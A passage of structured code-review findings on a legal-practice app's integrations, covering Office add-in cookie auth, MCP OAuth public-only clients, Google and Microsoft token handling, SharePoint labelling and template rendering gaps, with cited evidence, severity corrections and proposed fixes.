reviews.evidence: POST /auth/office/exchange (backend/app/routers/auth.py:1735-1816) sets the session only as cookies via _set_auth_cookies (auth.py:722-742, httponly, flags from _cookie_flags at auth.py:502-518, not 483-499 as cited). SameSite comes from COOKIE_SAMESITE, default 'lax' (backend/app/config.py:60), and no override was found in the repo. The response body is TokenResponse (backend/app/schemas/auth.py:91-96), which contains no token. The add-in then re-reads /auth/me with credentials:'include' (office-addin/src/auth/officeSession.ts:28-36,87-99). Every API call is cookie-only (office-addin/src/api/officeApi.ts:11-20). The pane loads from __APP_ORIGIN__/office/index.html (office-addin/manifests/outlook.xml:22), so on desktop the pane is a top-level WebView on the same origin as /api and Lax cookies work. nginx/snippets/office_addin.conf:1-3 itself says Office on the web embeds the pane cross-origin. In that iframe the site-for-cookies is cross-site, so the Lax Set-Cookie from the exchange response is rejected, /auth/me returns 401, and officeSession.ts:99 throws 'Office sign-in completed without a LawHand session'. The backend already accepts Bearer tokens as a fallback (backend/app/middleware/tenant.py:80-85,147-153).
reviews.correction: The core claim is right. Corrections: the auth.py line numbers are stale (_cookie_flags is at 502-518, cookie setting at 722-742 and 1809). The officeSession.ts:73-77 comment is about the non-NAA branch and wrongly calls the desktop request cross-site; the desktop request is same-origin and works. 'Only classic desktop clients work' also covers Mac desktop. Setting COOKIE_SAMESITE=none would not be a complete fix: it weakens CSRF for the main SPA, and third-party-cookie blocking (Safari, Firefox, and Chrome when users restrict it) would still drop iframe cookies unless they are partitioned. The feature is off by default and pilot-gated (config.py:112,115).
reviews.fix_sketch: Give the add-in a bearer path instead of shared cookies. Option A: /auth/office/exchange returns a short-lived LawHand access token in the body; the pane keeps it in memory only, and OfficeApi and OfficeSession send Authorization: Bearer (tenant.py already accepts Bearer), getting a new token when it expires. Option B: the /api/office/* routes and /auth/me verify the NAA Entra token on each request (reuse verify_microsoft_access_token) and map it to the linked user. Option C, not recommended: a separate SameSite=None; Secure; Partitioned (CHIPS) cookie scoped to /api/office. Update the misleading comment, and add a test in Office on the web and new Outlook.

reviews.evidence: backend/app/config.py:60 sets COOKIE_SAMESITE default 'lax'. backend/app/routers/auth.py:504-518 (_cookie_flags; the claim cites 483-499) capitalises it to 'Lax'. The Office exchange at auth.py:1745-1816 (the claim cites 1788-1790) calls _set_auth_cookies at ~1809 and returns no token in the body. office-addin/src/auth/officeSession.ts:28-36 and 86-100 POST to /auth/office/exchange, then re-read /auth/me with credentials:'include', and throw 'Office sign-in completed without a LawHand session' when that returns 401. The comment at officeSession.ts:73-77 admits the Lax cookie is never sent on the add-in's cross-site request. office-addin/src/api/officeApi.ts:12-14 also relies only on cookies. The manifests (office-addin/manifests/word-excel.xml:17-25, outlook.xml:17-25) serve the pane from __APP_ORIGIN__/office/, and main.ts:13 uses the same-origin '/api'. So in desktop WebView hosts the pane is top-level and same-site and cookies work. In Office on the web and new Outlook, the pane is iframed under office.com/outlook.office.com, so a Lax Set-Cookie from the fetch is rejected and not sent back. office-addin/README.md:18,38 shows Office on the web is an intended target. docs/reviews/PLATFORM_HARDENING_REVIEW.md:420-450 already records this as an open design decision.
reviews.correction: The claim is accurate, but its scope needs narrowing. This is an availability failure in a pilot-only feature (OFFICE_ASSISTANT_ENABLED is False by default, config.py:112, plus the pilot allowlist), not a security exposure. Classic desktop hosts (Windows and Mac) work. Word and Excel on the web and new Outlook fail. The claim's auth.py line numbers have drifted by about 20 lines.
reviews.fix_sketch: Pick one approach. (a) Have /auth/office/exchange return a short-lived LawHand access token that the add-in keeps in memory only and sends as an Authorization: Bearer header; middleware/tenant.py get_current_user already falls back to the Bearer header (~lines 151-156). Refresh by re-running the NAA exchange. (b) Issue a separate add-in-scoped SameSite=None; Secure; Partitioned (CHIPS) cookie limited to the /api/office paths. Either way, keep the main app's Lax cookie unchanged, and add a host check that shows a clear message when the host is web and the chosen approach is unavailable.

title: Workspace MCP OAuth supports only public clients, blocking Microsoft 365 Copilot and Gemini Enterprise
claim: AS metadata advertises token_endpoint_auth_methods_supported=['none'] (workspace_mcp_oauth.py:297); DCR rejects any other method and never returns a client_secret (313-404, esp. 350-363), and no admin/operator path creates a static confidential client (WorkspaceMCPClient is only created by DCR). Microsoft 365 Copilot MCP plugins require DCR that issues a secret and Gemini Enterprise requires client_id+client_secret, so ECO-09/12/21 are blocked; the ecosystem plan still lists this as existing leverage (docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:63).

reviews.evidence: routers/workspace_mcp_oauth.py:297 advertises token_endpoint_auth_methods_supported=['none']. DCR (313-404) rejects any token_endpoint_auth_method other than 'none' (350-363), stores token_endpoint_auth_method='none' (365-376), and returns no client_secret (386-397). The token endpoint (697-705) reads client_id from the form body only. It never parses an Authorization: Basic header or verifies a secret, so a host that uses client_secret_basic gets invalid_client. WorkspaceMCPClient is created only at routers/workspace_mcp_oauth.py:365 and routers/research_mcp_oauth.py:288, and research MCP is also public-only (188, 281). platform.py:2082-2108 only lists and counts clients. docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:63 lists 'OAuth 2.1 Workspace MCP with dynamic client registration' as existing Microsoft-agent leverage. External check: the Microsoft 365 Copilot DCR doc (MicrosoftDocs/m365copilot-docs plugin-authentication-dynamic-client-registration.md) says 'DCR without a client secret isn't supported yet. The authorization server must issue a client secret during registration.' Gemini Enterprise custom-MCP setup requires a Client ID and a Client Secret.
reviews.correction: Code facts are exact, and the external requirements check out against vendor docs. Nuances: WORKSPACE_MCP_ENABLED and WORKSPACE_MCP_DYNAMIC_REGISTRATION_ENABLED default to False (config.py:423,463), so this is a missing capability that blocks the roadmap, not a regression. One fragile workaround exists: register with DCR by hand, then enter a dummy secret in a host that uses client_secret_post (the token endpoint ignores extra client_secret). That workaround still breaks on Basic auth, on the 30-day client expiry (D62), and on the missing resource parameter (D63), so the ECO items are effectively blocked.
reviews.fix_sketch: Add confidential clients. Migration: client_secret_hash and client_secret_expires_at on workspace_mcp_clients, following the AGENTS.md migration head protocol. DCR accepts client_secret_post and client_secret_basic, generates a secret, stores only its hash, and returns client_secret plus client_secret_expires_at=0. The token and revoke endpoints parse Basic or post credentials and compare in constant time for confidential clients; public clients stay PKCE-only, and PKCE is still required for everyone. AS metadata lists ['none','client_secret_post','client_secret_basic']. Add an operator or tenant-admin endpoint and UI to create static confidential clients, with a host redirect-URI allowlist (Teams oAuthRedirect, Copilot Studio, Gemini Enterprise callbacks) and secret rotation. Apply the same to research_mcp_oauth. Tests for both auth methods, secret mismatch, and a public client presenting a secret.

reviews.correction: The code facts are correct. The claim overstates this as a high-severity defect: public-client-only is a deliberate security design for desktop MCP clients (see the model docstring), and both the feature and DCR are off by default. It is an interoperability gap on the roadmap, not a vulnerability or regression. The claim that M365 Copilot and Gemini Enterprise require a confidential client secret is a vendor requirement the repo cannot confirm. Other code-level blockers for hosted clients support the 'blocked' conclusion either way: registrations expire after 30 days (max 90), the token endpoint requires an exact 'resource', and the token endpoint reads client_id only from the form body, so HTTP Basic client authentication cannot work. The research MCP AS has the same public-only limit.
reviews.evidence: backend/app/routers/workspace_mcp_oauth.py:297 advertises token_endpoint_auth_methods_supported=['none']. 350-363 rejects any token_endpoint_auth_method other than 'none'. 365-375 creates WorkspaceMCPClient with auth method 'none' and expires_at = now + WORKSPACE_MCP_CLIENT_REGISTRATION_DAYS. The 201 response at 386-397 has no client_secret. 698-707: the token endpoint takes client_id from the form, checks no secret, and requires workspace_resource_is_allowed(resource) (backend/app/services/workspace_mcp_oauth.py:82-83, exact match). backend/app/models/workspace_mcp_client.py:15-21 says 'Desktop MCP clients cannot keep a client secret' and the model has no secret column. WorkspaceMCPClient( is instantiated only at workspace_mcp_oauth.py:365 and research_mcp_oauth.py:288, and the latter is also public-only (188, 281, 294). There is no admin/static client path. backend/app/config.py:423 WORKSPACE_MCP_ENABLED=False, 444 REGISTRATION_DAYS=30, 463 WORKSPACE_MCP_DYNAMIC_REGISTRATION_ENABLED=False. docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:63 lists 'OAuth 2.1 Workspace MCP with dynamic client registration' as existing Microsoft-agent leverage.
reviews.fix_sketch: Add a confidential client type. (1) Store a hashed client_secret (argon2/sha256 plus pepper) and support rotation and revocation. (2) Accept client_secret_post and client_secret_basic at /token and /revoke, parsing the Authorization header. (3) Advertise these methods in AS metadata. (4) Offer a tenant-admin static registration path (UI plus API) with pre-approved host redirect URIs, such as the Teams/Copilot OAuth redirect and the Gemini Enterprise redirect, and sliding or non-expiring lifetimes for verified hosted clients. (5) Optionally default 'resource' to the canonical resource. Keep grants user-consented and tenant-scoped. Do not let open DCR mint trusted secrets without admin approval. This needs a migration (follow the AGENTS.md head protocol), tests, and a docs correction for plan line 63.

title: Re-authorize for Personal-Google tenants always fails and bounces the admin into onboarding
claim: IntegrationsPanel.handleReauthorize (IntegrationsPanel.jsx:174-181) calls /integrations/google/connect?intent=admin without account_mode; the backend defaults to 'workspace' (integrations.py:658-662) and requests the directory scope, and the callback rejects the personal account with account_mode_mismatch (integrations.py:798-800). _error_redirect then sends all admin errors to /onboarding (integrations.py:1790-1807). A solo/personal-Gmail firm with a revoked token cannot repair it from Admin > Cloud.

reviews.evidence: On origin/main the claim is accurate. IntegrationsPanel.jsx:174-181 (main) builds /integrations/google/connect?intent=admin with no account_mode. Backend google_connect defaults account_mode='workspace' (integrations.py:657-662) and requests GOOGLE_ADMIN_SCOPES (integrations.py:275-280, 708). The callback verifies the id_token and returns account_mode_mismatch for a personal account (integrations.py:780-800). _error_redirect sends intent=admin errors to /onboarding (integrations.py:1790-1807). On this branch HEAD the frontend half is fixed by ca6812e: handleReauthorize (IntegrationsPanel.jsx:255-265) sends account_mode=personal when data.google.account_type==='personal'. The /admin/permissions payload includes account_type even for an inactive credential (admin.py:1688-1703). Tests cover it at IntegrationsPanel.test.jsx:417,428. ca6812e is only on origin/claude/365-google-workspace-review-tr9zb1, not on origin/main (git merge-base check).
reviews.correction: This is fixed on the current branch (ca6812e, PR #610 not yet merged), so 'always fails' holds only for main. The '/onboarding bounce' is a separate defect, D71. Severity is overstated as high: it affects only personal-Gmail tenants with a broken token, and a workaround exists on main. The admin lands on /onboarding, can 'Restart setup', and the wizard preselects Personal Google from the stored account_type (OnboardingWizard.jsx:101-103, 130 on main). A small residual remains after the fix. A Google credential whose account_type is null or 'unknown' (for example a legacy row whose backfill ran after revocation; account_detect.py:140-175 stamps 'unknown' when no token can be fetched) still re-authorizes in workspace mode. The connected card offers no 'personal Gmail' alternative, because onConnectPersonal is shown only on the not-connected card when the other provider is not connected (IntegrationsPanel.jsx:796).
reviews.fix_sketch: Merge PR #610 (already implements account_mode on re-authorize). For the residual: when google.account_type is not 'workspace' or 'personal', show a secondary 'Reconnect as personal Gmail' action on the connected Google card that calls handleReauthorize('google', {accountMode:'personal'}). Optionally, make the backend retry-hint on account_mode_mismatch, redirecting with a suggested_mode param. Add a unit test.

reviews.correction: The claim is accurate for origin/main but already fixed on the current branch HEAD (claude/365-google-workspace-review-tr9zb1), in commits 6e7de82 and 1e333da. Neither commit is on origin/main yet. On main the right severity is medium, not high: only admins trigger it, only solo/personal-Google tenants are affected, nothing is exposed, and setup re-entry is a workaround. What is left on HEAD is narrow. A legacy personal tenant whose google account_type is null or 'unknown' (for example, a revoked token that the backfill could not classify) still re-authorizes in Workspace mode. The mismatch error now returns the admin to Admin > Cloud instead of /onboarding. The connected/revoked ProviderCard offers no 'Connect Personal' option; only NotConnectedCard does.
reviews.evidence: origin/main frontend/src/components/IntegrationsPanel.jsx:174-181 (read via git show) redirects to /integrations/google/connect?intent=admin with no account_mode or return_to. That confirms the original bug. HEAD frontend/src/components/IntegrationsPanel.jsx:256-266: handleReauthorize adds account_mode=personal when data.google.account_type==='personal' and always adds return_to=integrations. Line 412 wires onConnectPersonal for the not-connected card only. backend/app/routers/admin.py:1690 exposes account_type in /admin/permissions. backend/app/routers/integrations.py:667-672 adds the return_to Literal param, stored in state at 729-733. The google callback (753-770) builds failure() with return_to. 829-831 returns account_mode_mismatch through failure(). _error_redirect at 1821-1846 sends return_to=integrations errors to /admin?tab=integrations&integration=cloud. 869 apply_detection always stamps the verified account_type on admin connect, so a personal tenant connected through the current flow carries 'personal'. Tests: frontend/src/components/IntegrationsPanel.test.jsx:417,428 assert account_mode=personal on re-authorize. git merge-base shows 6e7de82 and 1e333da are not ancestors of origin/main.
reviews.fix_sketch: Merge the branch. For the residual case, when account_type is null/unknown or the return carries error=account_mode_mismatch&provider=google, also offer a 'Re-authorize as Personal Google' action (handleReauthorize('google',{accountMode:'personal'})) on the connected ProviderCard.

title: SharePoint-backed matters appear unprovisioned and their documents are labelled 'Local'
claim: storageLabel() has no 'sharepoint' case and returns 'Local' (MatterDocumentsTab.jsx:68-73), and CloudFolderCard treats a matter as provisioned only if providers.onedrive or providers.google_drive exists (MatterDocumentsTab.jsx:157-165), although the backend stores cloud_folder['sharepoint'] and storage_backend='sharepoint' (cloud_init.py:510-588; matter_file_store.py:1360-1425). MatterDetailPage.jsx:144-161 skips SharePoint and labels any non-OneDrive folder 'Google Drive'; MatterSmbSharesTab.jsx:52-55, 227 omit it too. SharePoint firms see 'Document folders are not set up', a 'Set up folders' prompt, 'Open in Local' rows, a LOCAL chip and a 'Saved to Local' toast (MatterDocumentsTab.jsx:440-445).

reviews.evidence: frontend/src/components/MatterDocumentsTab.jsx:68-73: storageLabel() handles google_drive, onedrive and cloud, and returns 'Local' for anything else. backend/app/services/matter_file_store.py:1398-1405 returns StorageResult(backend='sharepoint'). backend/app/models/matter_document.py:212-256 keeps 'sharepoint' as the explicit storage_backend. Every SharePoint-stored document therefore shows 'Open in Local' (MatterDocumentsTab.jsx:1284-1286), a Cloud icon next to 'Local' (1300-1305) and the toast 'Saved to Local. Edits happen in the firm's cloud copy.' (440-445). Those parts are certain. CloudFolderCard (MatterDocumentsTab.jsx:157-162) computes isProvisioned from providers.onedrive or providers.google_drive only, and never renders an 'Open in SharePoint' link. MatterDetailPage.jsx:144-161 builds header/detail links from onedrive and google_drive only. Line 162 labels any context folder that is not onedrive as 'Google Drive', although sharepoint is an allowed context provider (backend/app/routers/matters.py:109, 3209-3211). MatterSmbSharesTab.jsx:52-55 CLOUD_PROVIDERS omits sharepoint, and 227 computes anyMapped without it. GET /cloud-folder returns the whole matter.cloud_folder as providers (matters.py:2915-2920).
reviews.correction: The claim that SharePoint firms see 'Document folders are not set up' and a 'Set up folders' prompt is overstated as the typical case. backend/app/services/cloud_init.py:147-168 always creates a OneDrive root when a Microsoft token exists, before the SharePoint root at 170-197. initialize_matter_folders (cloud_init.py:510-575) then provisions every provider present in cloud_root, so a SharePoint firm's matters normally carry both onedrive and sharepoint bindings, and isProvisioned is true. The actual common symptom: the card shows 'Open in OneDrive', which points at the connecting admin's personal OneDrive copy. Documents are written to the SharePoint library, because matter_file_store.py:171-178 uses primary_cloud_provider. The 'not set up' state appears only when no OneDrive or Google binding exists, e.g. the OneDrive root failed for an admin without OneDrive, or the matter was remapped to SharePoint only. The 'Set up folders' button renders unconditionally for every provider (MatterDocumentsTab.jsx:225-235), so it is not SharePoint-specific. Severity is medium, not high: it is mislabelling and misdirection, with no data loss.
reviews.fix_sketch: Add a shared providerLabel map ({onedrive:'OneDrive', sharepoint:'SharePoint', google_drive:'Google Drive', cloud:'Cloud', local:'Local'}) and use it in storageLabel, in the MatterDetailPage context-folder label and in MatterSmbSharesTab. In CloudFolderCard, read sp = providers.sharepoint, include it in isProvisioned and render 'Open in SharePoint'. Add sharepoint to cloudStorageLinks and to CLOUD_PROVIDERS in MatterSmbSharesTab. Optionally, have MatterCloudFolderStatus return primary_cloud_provider so the UI puts the primary link first and marks or hides the admin-personal OneDrive link for SharePoint-primary firms. Add vitest cases with a sharepoint-only binding and a sharepoint-backed document.

reviews.evidence: frontend/src/components/MatterDocumentsTab.jsx:68-73: storageLabel has no 'sharepoint' case and returns 'Local'. It is used for the row chip (1297-1306), 'Open in …' (1284-1286, 1410) and the upload toast 'Saved to Local. Edits happen in the firm's cloud copy.' (440-445). MatterDocumentsTab.jsx:157-162 sets isProvisioned = status==='provisioned' && (od || gd) and ignores providers.sharepoint, so a SharePoint-only matter shows 'Document folders are not set up' and 'Set up folders' (217-235). MatterDetailPage.jsx:144-161 cloudStorageLinks lists only onedrive and google_drive, and labels any context folder whose provider is not onedrive as 'Google Drive'. MatterSmbSharesTab.jsx:52-55 CLOUD_PROVIDERS omits sharepoint, so anyMapped (227) is false and the tab shows 'No cloud folder mapped yet' (279). The backend does write cloud_folder['sharepoint'] (cloud_init.py:510-588). When TenantSettings.primary_cloud_provider='sharepoint', storage goes exclusively to SharePoint (matter_file_store.py:142-180, 636-686) with backend='sharepoint' (1360-1425). The cloud-folder GET returns the raw cloud_folder dict (matters.py:2895-2920).
reviews.correction: Every document stored in SharePoint is mislabelled 'Local' (row chip, 'Open in' link and upload toast). The 'Document folders are not set up' state, though, is conditional. For Microsoft tenants, ensure_cloud_root also creates a OneDrive root alongside SharePoint (cloud_init.py:146-199), and provisioning binds every root (510-588). Typical SharePoint firms therefore do have providers.onedrive, so the card shows only an 'Open in OneDrive' link, pointing at the admin's OneDrive copy rather than the SharePoint library where primary=sharepoint files live. The unprovisioned banner appears only when the OneDrive root is missing, for example when the connecting account has no OneDrive or only SharePoint is mapped. This is a trust and UX problem, not data exposure, so the correct severity is medium, not high.
reviews.fix_sketch: Add a 'sharepoint' → 'SharePoint' case to storageLabel. Include providers.sharepoint in isProvisioned and render an 'Open in SharePoint' link. Add sharepoint to cloudStorageLinks and the context-folder provider label map in MatterDetailPage, and to CLOUD_PROVIDERS in MatterSmbSharesTab. Consider ordering the links so the tenant's primary_cloud_provider comes first. Add unit tests for storageLabel and CloudFolderCard with a SharePoint-only fixture.

title: MCP/workflow template render ignores Studio conditional and repeating regions
claim: render_workspace_template (document_template_workspace.py:274-284) calls fill_docx_template without collections= or regions=, whereas the in-app render passes collections=_repeat_collections(parties) and regions=stored_regions(schema) (document_templates.py:4687-4698). Studio regions exist only in the field map (template_regions.py:1-12), so drafts produced by external assistants or workflows include every if/unless clause and do not expand per-party sections: the same template yields different legal text depending on the render path.

reviews.evidence: backend/app/services/document_template_workspace.py:255-305: render_workspace_template calls fill_docx_template(source, variable_schema=, variables=, enforce_required=True) at 276-284, with no collections= and no regions=. backend/app/routers/document_templates.py:4687-4698 (in-app save) passes collections=_repeat_collections(render_parties) (1981-2006) and regions=stored_regions(template.variable_schema). docx_templates.py:870-878: both default to None. At 1026-1030, inject_stored_regions(document, regions or ()) returns 0 for no regions (611-628), so Studio-stored if/unless/each ranges (template_regions.py:1-14, 152-163) never become markers. apply_docx_logic (660-683) still resolves marker text typed in Word, but with collections={}, an in-document {{#each}} drops its whole section (520-533). Item-bound fields are held back from normal replacement (931-942), so a stored `each` region that is never injected keeps the item fields' source_text, meaning the sample document's own party text, in the output. The path is live for Workspace MCP (workspace_mcp_protocol.py:126), workflows (workflow_run_contract.py:34, automation_capabilities.py:565) and chat tools (chat_tools/handlers.py:1270-1282). None of these is behind a feature flag in config.py.
reviews.correction: Precision: marker text authored in Word ({{#if}}/{{#unless}}) is resolved correctly on this path. Only editor-stored Studio regions are skipped, and for those every clause is kept. 'Does not expand per-party sections' also needs precision: a Word-authored {{#each}} section is removed entirely (zero items), and a Studio-stored each region appears once with the sample's original item text rather than matter parties. Mitigation: output is a proposal that must pass staff/attorney review before filing. Related extra finding: the in-app render-file preview (document_templates.py:3496-3503) also omits collections and regions, while DOCX->PDF matter saves require a preview whose output_sha256 must match the save (4627-4636, 4786-4798). Templates with stored regions or party repeats will therefore get a 409 'freshly rendered PDF does not match the reviewed preview' on in-app PDF generation.
reviews.fix_sketch: Extract one shared service function, e.g. render_docx_for_matter(db, template, matter, variables, enforce_required), that loads matter parties (_load_matter_parties) and calls fill_docx_template with collections=_repeat_collections(parties) and regions=stored_regions(schema). Move _repeat_collections and _party_item out of the router into a service module. Use the function in render_workspace_template, the in-app save (4687), and the render-file preview (3496). Add a parity test that renders one template with stored if/each regions and parties through the MCP proposal path and the in-app path and asserts byte-identical DOCX output, plus a preview-to-save PDF hash test for a template with regions.

reviews.evidence: backend/app/services/document_template_workspace.py:274-284: render_workspace_template calls fill_docx_template with only variable_schema, variables and enforce_required=True. It passes no collections and no regions. By contrast, routers/document_templates.py:4687-4698 (the in-app save/generate path) passes collections=_repeat_collections(render_parties) and regions=stored_regions(template.variable_schema). In services/docx_templates.py:1022-1030, fill always runs inject_stored_regions(document, regions or ()) and then apply_docx_logic(document, variables, collections). So on the MCP/workflow path, Studio-stored regions (template_regions.py:1-14: paragraph ranges kept only in the field map) are never injected and their paragraphs are all kept. In-document {{#if}}/{{#unless}} markers are still resolved (docx_templates.py:533-538). An in-document {{#each}} gets collections={}, so the whole section is dropped (docx_templates.py:519-531). Item-bound fields are held out of the main replacement pass (docx_templates.py:927-937) and are only substituted during each-cloning. That means a Studio-stored each region left un-injected keeps the reviewed source_text verbatim. The same omission exists in the in-app render-file/preview endpoint (document_templates.py:3441-3502 calls fill_docx_template without collections or regions). Callers: chat_tools/handlers.py:1272-1305 (propose_document_from_template → render_workspace_template → _propose_matter_document); the same handler is reached from workflows (automation_capabilities.py:565-574, workflow_run_contract.py:34) and MCP (workspace_mcp_protocol.py:126). Guard: the output is a staged proposal routed to staff/attorney reviewers (handlers.py:1285-1305), not delivered.
reviews.correction: The claim overstates what breaks. In-document {{#if}}/{{#unless}} markers typed in Word are still resolved on the MCP path, and only Studio-stored regions are ignored. In-document {{#each}} sections are deleted entirely, not left unexpanded. The claim also misses two points. Studio-stored each regions are emitted once with their reviewed source text left in place. That text comes from the uploaded source document and can be a sample or a prior client's name, which is a small confidentiality risk in the draft. The in-app render-file preview has the same gap, so the preview can also differ from the saved document. A mandatory human review of the proposal limits the impact, hence medium rather than high.
reviews.fix_sketch: Move _repeat_collections, _party_item and _load_matter_parties out of routers/document_templates.py into a service module. In render_workspace_template, load the matter's parties (the matter is already resolved by require_workspace_template) and pass collections=... and regions=stored_regions(template.variable_schema). Do the same in preview_template_file (document_templates.py:3496-3502) when a matter is provided. Add a parity test that renders one template with Studio if/unless/each regions and item-bound fields through the in-app path and through propose_document_from_template, and asserts identical DOCX bytes.

title: Approved client email falls back to sending from the connecting admin's mailbox
claim: When the approver has no per-user grant, connected_mail uses the tenant credential (the admin's delegated token) with /me/sendMail and saveToSentItems=True (connected_mail.py:381-420); there is no shared-mailbox support (Mail.Send.Shared or /users/{shared}/sendMail). Clients receive correspondence from the managing partner's address, it lands in that partner's Sent Items, and replies go to the wrong person.

reviews.evidence: connected_mail.py:383-420: when no per-user row has send scope or a usable token, the code loads the active TenantCredential rows, calls get_fresh_token(db, tenant, provider) at 402, and calls _attempt_provider(..., firm_mailbox=True) at 406-419. _send_microsoft POSTs /me/sendMail (connected_mail.py:92) with saveToSentItems=True (125) and sets no replyTo or from, and no code path uses /users/{mailbox}/sendMail or Mail.Send.Shared. The Google path sends via /users/me/messages/send (connected_mail.py:178). The tenant credential is whoever did the admin connect (integrations.py:584-619). This is the documented design: platform_docs 18-cloud-provider-support.md:67 says 'then an available firm mailbox', and IntegrationsPanel.jsx:959-962 now says the connection acts as {service_account_email}.
reviews.correction: The mechanics are accurate. The sender is whichever account performed the admin connect, which is not necessarily the managing partner: a firm that connected with a dedicated shared account gets correct behavior. The Google fallback behaves the same way, though the claim mentions only Microsoft. The admin-panel disclosure now exists, but nothing tells the approver at approval time which mailbox will send.
reviews.fix_sketch: Short term: return the resolved sender (the tenant credential's service_account_email) in the approval preview, show 'Will send as X' in the approve UI, and set replyTo to the approving user's email in both the Graph and Gmail payloads. Longer term: add a tenant 'firm sender mailbox' setting and send via /users/{shared}/sendMail with Mail.Send.Shared (for Gmail, a send-as alias or domain-wide delegation), or make the tenant fallback an explicit admin opt-in and otherwise return REAUTHORIZATION_REQUIRED or UNCONFIGURED.

title: Gmail sync/search uses the Drive-only service-account token on org Shared Drive tenants and silently returns nothing
claim: cloud_sync._get_token applies prefer_service_account to every Google call, not just Drive (cloud_sync.py:833-864, esp. 854-864); the service-account token carries only DRIVE_SCOPES and no domain-wide-delegation subject (google_service_account.py:213-243). Gmail rejects it with 403, sync_gmail_metadata returns 0 without raising (cloud_sync.py:494-501), and Gmail search through cloud_search._get_google_token gets the same swap. Workspace firms on the default Shared Drive path never get Gmail indexed or searched and see a successful 0-item sync.

reviews.evidence: cloud_sync.py:833-864: _get_token calls google_service_account.prefer_service_account for every Google token (860), including tokens for Gmail. sync_gmail_metadata gets its token from self._get_token(db, tenant_id, 'google', user_id) (cloud_sync.py:468). It is called with no user_id from the tenant sync (132), so the swap always applies there. prefer_service_account (google_service_account.py:213-258) returns get_access_token(DRIVE_SCOPES) with no subject once the Shared Drive probe passes. DRIVE_SCOPES is only auth/drive (41), and a subject is added only when one is passed (103-104). A Gmail list with that token is non-200, and the code at 493-500 logs and returns 0 without raising. _run_provider_sync (270-300) records a failure only on an exception, so the run reports success with 0 emails. In cloud_search, _get_google_token (1516-1527) applies the same swap to the tenant fallback, and one prefetched google_token is handed to both _search_google_drive and _search_gmail (186-247).
reviews.correction: Two preconditions and one scope limit. (1) This only happens when the deployment sets GOOGLE_SERVICE_ACCOUNT_KEY (it defaults to empty, config.py:165-166; without it get_access_token returns None and the delegated token is used) and the tenant is bound to an org_shared_drive that the service account can reach. With GOOGLE_AUTO_SHARED_DRIVE=True (config.py:173) and auto-provisioning for Workspace accounts (cloud_init.py:237-249), that is the default on a hosted deployment that has a service account. (2) Gmail search breaks only for users without a personal Google token: _get_google_token returns a user token before the swap (1522-1525). The Gmail metadata sync is fully affected.
reviews.fix_sketch: Give the swap a purpose. Apply prefer_service_account only in Drive code paths (sync_google_drive and the matter-folder sync, Drive search, Drive content fetch) and never for Gmail. In cloud_search, prefetch a separate gmail token (user or delegated only). In cloud_sync._get_token, add a drive=True/False argument. Make a non-200 Gmail list with no messages raise, so _run_provider_sync records a failure instead of 0. Add a regression test with an org_shared_drive tenant and a mocked service account.

title: get_fresh_token holds a FOR UPDATE lock on the tenant token row for the caller's whole transaction
claim: get_fresh_token takes SELECT ... FOR UPDATE (token_vault.py:196-209) and returns without committing on the fresh-token path (token_vault.py:413-432). Concurrent requests needing the same tenant credential (every no-personal-token user in RAG/search) wait on lock_timeout=5s, after which _execute_locked_scalar returns None and the provider reads as 'not connected'. Microsoft sources intermittently drop out of answers under concurrent load. PLAUSIBLE from code reading.

reviews.evidence: token_vault.py:190-207: _locked_tenant_credential runs SELECT ... FOR UPDATE, after _set_lock_timeout sets SET LOCAL lock_timeout=5000ms (23, 166-169). get_fresh_token (413-432) returns the decrypted token at 429-430 without committing; only the refresh path commits (_refresh_locked_row 302-310). The row lock therefore lasts until the caller's transaction ends. Chat streaming passes the request db into hybrid_rag_query (chat.py:3487-3489, rag.py:2044-2056). _connected_source_session yields that same supplied session (rag.py:1802-1804), and cloud_search prefetches Google and Microsoft tokens on it (cloud_search.py:186-197). There are no commits in cloud_search.py or rag.py, and the stream commits only at chat.py:4053, after LLM generation. A concurrent waiter hits the lock timeout; _execute_locked_scalar rolls back the waiter's session and returns None (177-187). _prefetch_token then yields None, and the provider is dropped from run_google or run_microsoft (cloud_search.py:200-204). Users with a personal token return early (1522-1525, 1537-1540) and never lock the tenant row.
reviews.correction: Supported by reading the code; not reproduced at runtime. The scope is wider than stated: it affects the Google tenant credential too, not only Microsoft, and every other get_fresh_token consumer blocks behind the held lock (calendar push, the connected_mail firm fallback, sync). A waiter that times out also has its whole transaction rolled back (token_vault.py:184), not just its token lookup.
reviews.fix_sketch: Take the fast path without a lock: read the TenantCredential with a plain SELECT, and return the token if it is fresh. Only when a refresh is needed, open a short-lived separate session (async_session_maker), SELECT ... FOR UPDATE, re-check freshness, refresh, and commit, so the lock never outlives the refresh. Apply the same change to get_fresh_user_token. Keep set_tenant_context on the helper session. Add a concurrency test: two sessions, where the first holds a transaction open after get_fresh_token and the second must still get the token without waiting.

title: Microsoft consent requests unused or over-broad scopes (Chat.ReadWrite, TeamsActivity.Send, per-user Files.ReadWrite.All, admin Mail.Read)
claim: Chat.ReadWrite and TeamsActivity.Send are required for teams_connected (teams.py:40-47; teams_gate.py:25-28), but nothing in backend/app calls /chats or sendActivityNotification and the Teams manifest has no activities block. Per-user Microsoft tokens are used only for reads (cloud_search, cloud_sync, document_sync), so Files.Read.All would suffice instead of Files.ReadWrite.All; admin Mail.Read only reaches the admin's own mailbox (feeding the mailbox-index leak); sign-in requests offline_access/User.Read and discards the tokens (auth.py:1324, 1372). Over-broad consent ('read and write all your chats', 'full access to all files') blocks law-firm security reviews.

reviews.evidence: backend/app/services/teams.py:39-47: TEAMS_REQUIRED_SCOPES includes Chat.ReadWrite and TeamsActivity.Send. teams_gate.py:25-28 and 31-53 make teams_connected depend on all of them. A grep of backend/app, teams-app, office-addin and frontend/src for /chats, sendActivityNotification, activityType and TeamsActivity finds only the scope constant and marketing/integration-scopes.json. teams-app/manifest.json has webApplicationInfo but no 'activities' block. Per-user MS token consumers only read files: document_sync.py:141-163 (list /me/drive) and 344-356 (download content), cloud_search.py:1537, and cloud_sync.py:855-857 (fallback resolver). File writes (matter_file_store.py:42-50, 832, 925; cloud_init.py:148 and others) use the tenant token via get_fresh_token. integrations.py:255-258 MICROSOFT_USER_SCOPES still asks for Files.ReadWrite.All, and ConnectedAccountsCard.jsx:14 promises 'save'. Admin Mail.Read is delegated, so it only reads the admin's own /me/messages (cloud_sync.py:733-743, tenant-token fallback). auth.py:1343 and 1391 (the cited 1324/1372 have drifted) request User.Read and offline_access at sign-in. After id_token verification (1395-1415), access_token and refresh_token are never used.
